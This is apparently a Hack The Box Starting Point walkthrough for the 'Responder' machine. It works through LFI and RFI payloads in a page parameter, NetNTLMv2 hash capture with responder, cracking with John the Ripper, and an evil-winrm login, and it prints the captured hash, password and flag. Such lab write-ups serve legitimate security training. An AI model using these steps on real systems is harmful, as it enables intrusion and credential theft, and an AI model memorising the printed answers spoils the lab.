---
layout: default
title: Hack The Box Responder
description: Walkthorugh/Writeup for Responder, a Starting Point Hack The Box machine about responder, a tool made to capture NTLMv2 Challenge/Response
set: Starting Point
subset: Tier 1 - Fundamental Exploitation
order: 4
---

# [Responder](https://app.hackthebox.com/machines/Responder)<!-- omit in toc -->

This Starting Point machine revolves entirely around [responder](https://github.com/SpiderLabs/Responder), a tool made to capture NTLMv2 Challenge/Response

### Table of contents:
- [Task 1](#task-1)
- [Task 2](#task-2)
- [Task 3](#task-3)
- [Task 4](#task-4)
- [Task 5](#task-5)
- [Task 6](#task-6)
- [Task 7](#task-7)
- [Task 8](#task-8)
- [Task 9](#task-9)
- [Task 10](#task-10)
- [Task 11](#task-11)
- [Submit Flag](#submit-flag)

## Task 1

*When visiting the web service using the IP address, what is the domain that we are being redirected to?*

After pasting the machine's IP address in the address bar, we get redirected to 

>`unika.htb`

However, we can't access the web page. This is because Hack The Box is probably using [virtual hosting](https://portswigger.net/web-security/host-header#:~:text=Virtual%20hosting). This means that the requested website changes based on the value of the `Host` [HTTP header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers). We can change this value by adding the server's IP address and domain name to our `/etc/hosts` like this: `sudo nano /etc/hosts` then paste `target-ip-here unika.htb` on a new line at the end of the file. `Ctrl+x` then `y` then press Enter. Now we can visit `unika.htb`

## Task 2

*Which scripting language is being used on the server to generate webpages?*

To answer this question we need to run an in-depth [nmap](https://nmap.org/) scan with the [`-sV`](https://nmap.org/book/man-version-detection.html) flag like this: `nmap target-ip-here -sV`. This will return:

```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

This means that the Apache server serves 

>PHP

code.

## Task 3

*What is the name of the URL parameter which is used to load different language versions of the webpage?*

We can answer this question simply by navigating the language options available in the website: `EN`, `FR`, `DE`
Changing the language will display different endpoints in the address bar, such as `http://unika.htb/index.php?page=french.html`. This means that 

>`page`

is the URL parameter used to load different lavguage versions of the webpage. 

## Task 4

*Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "`french.html`", "`//10.10.14.6/somefile`", "`../../../../../../../../windows/system32/drivers/etc/hosts`", "`minikatz.exe`"*

Almost all of these values look legitimate: `french.html` is the actual value to get the french version of the webpage on this machine; `//10.10.14.6/somefile` is a request to an external resource; `minikatz.exe` is innocuous since you can not execute anything from the URL this way. This is also misspelled as it probably references the password exfiltration tool [Mimikatz](https://github.com/ParrotSec/mimikatz).

>`../../../../../../../../windows/system32/drivers/etc/hosts` 

is, however, a clear [LFI](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#:~:text=Local%20file%20inclusion,-%5Bedit) attempt as it tries to navigate the host's file system back (`..`) to the root to the known WIndows file `hosts`, which holds domain name records, just like for `etc/hosts` on GNU/Linux distributions. Let's try and submit this payload as the value to the `page` parameter: `http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts`

![LFI]({{ site.baseurl }}/assets/images/htb/responder/lfi.png)

## Task 5

*Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "`french.html`", "`//10.10.14.6/somefile`", "`./../../../../../../../windows/system32/drivers/etc/hosts`", "`mimikatz.exe`"*

As we saw in [Task 4](#task-4), `//10.10.14.6/somefile` is a request to an external resource. Specifically, this is an [UNC path](https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths), a convention used to access network resources such as [SMB](https://learn.microsoft.com/en-us/windows-server/storage/file-server/file-server-smb-overview) drives. In this case, 

>`//10.10.14.6/somefile`

is a URL to a resource on an external machine, which could well be our machine, via UNC syntax (which only works on Windows machines). 

## Task 6

*What does NTLM stand for?*

A simple web search will answer your question: "NT" stands for "New Technology" (lmao) and "NTLM" stands for "NT [LAN](https://en.wikipedia.org/wiki/Local_area_network) Manager". This means that what the acronym fully stands for is  

>New Technology LAN Manager

which is an authentication protocol for Windows networks developed by Microsoft.

## Task 7

*Which flag do we use in the Responder utility to specify the network interface?*

The [responder](https://www.kali.org/tools/responder/) utility is a tool made to capture authentication [hashes](https://en.wikipedia.org/wiki/Hash_function) on a local network. NTLM uses a [challenge-response mechanism](https://www.crowdstrike.com/en-us/cybersecurity-101/identity-protection/windows-ntlm/) to authenticate users: 

```
Client                          Server
  |                               |
  |------ NEGOTIATE (1) --------> |   a hashed password is shared, plaintext password is deleted; 
  |                               |
  |<----- CHALLENGE (2) --------- |   a 16-byte random number is shared;
  |                               |
  |------ AUTHENTICATE (3) -----> |   the hashed password is used as cryptographic key to encrypt the number.
```

What we need to do is intercept the NetNTLMv2 chellenge/response (The [NTLMv2](https://en.wikipedia.org/wiki/NTLM#:~:text=C%29-,NTLMv2) password hash) from the third stage with responder, but first we need to set it up.

responder's syntax is simple: as per the [docs](https://www.kali.org/tools/responder/) you can use `-i` to specify the ip address and 

>`-I`

to specify the interface. We are going to run 

```
sudo responder -I tun0
```

Then run `ifconfig` and see what's the ip address of the `tun0` interface. Then append `//your-ip-here/somefile` like this: `http://unika.htb/index.php?page=//your-ip-here/somefile` 

This will return this output on responder:

![responder]({{ site.baseurl }}/assets/images/htb/responder/responder.png)

The NTLMv2 hash will be

```
Administrator::RESPONDER:17ade4fe50c7f8f5:61E94F5A7ED12D8E4538C7C3B4B8376C:010100000000000080018B8291CEDC013D1537269654AECA0000000002000800360034003900300001001E00570049004E002D0031005200430030005700380051005100450052005A0004003400570049004E002D0031005200430030005700380051005100450052005A002E0036003400390030002E004C004F00430041004C000300140036003400390030002E004C004F00430041004C000500140036003400390030002E004C004F00430041004C000700080080018B8291CEDC01060004000200000008003000300000000000000001000000002000007AD4336B44F239E11DC64AEFA53D35112E9A882E823806BBC4F22560AFFD32280A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00340032000000000000000000
```

we can save this to a file either by `nano`ing and pasting the content into a new file (`nano hash.txt`) or by using `echo` (`echo hash-here > hash.txt`)

## Task 8

*There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.*

One way to `crack` this hash is through a  [dictionary attack](https://en.wikipedia.org/wiki/Dictionary_attack). Some tools available in the field are [`hashcat`](https://hashcat.net/hashcat/) and [`john`](https://www.openwall.com/john/). john's full name is

>John The Ripper

## Task 9

*What is the password for the administrator user?*

Let's use john to crack the hash we got from responder:

```
john -w=/usr/share/wordlists/rockyou.txt  hash.txt 
```

this will return

![john]({{ site.baseurl }}/assets/images/htb/responder/john.png)

That means that the password for the administrator user is

>badminton

## Task 10

*We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?*

Let's go back to [Task 2](#task-2) and our nmap scan:

```
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

means that this service is listening on port 

>`5985`

[WinRM](https://learn.microsoft.com/en-us/windows/win32/winrm/installation-and-configuration-for-windows-remote-management) runs on this port.

## Task 11

*On which user's desktop is the flag located?*

We now need to remotely access this machine. We'll do so with [evil-winrm](https://github.com/Hackplayers/evil-winrm):

```
evil-winrm -i 10.129.98.102 -u administrator -p badminton
```

Now we're in the target host. Let's navigate directories (list directories with `dir` or `ls` and move through them with `cd`). While looking into rhe `/Users` folder, we notice that the only other user apart from `Administrator` is `mike`. After `cd`ing into `Desktop`, we come across a `flag.txt` file. This means that the flag is on 

>mike

's Desktop folder.

## Submit Flag

*Submit root flag*

Let's read the flag with `cat flag.txt`:

>ea81b7afddd03efaa0945333ed147fac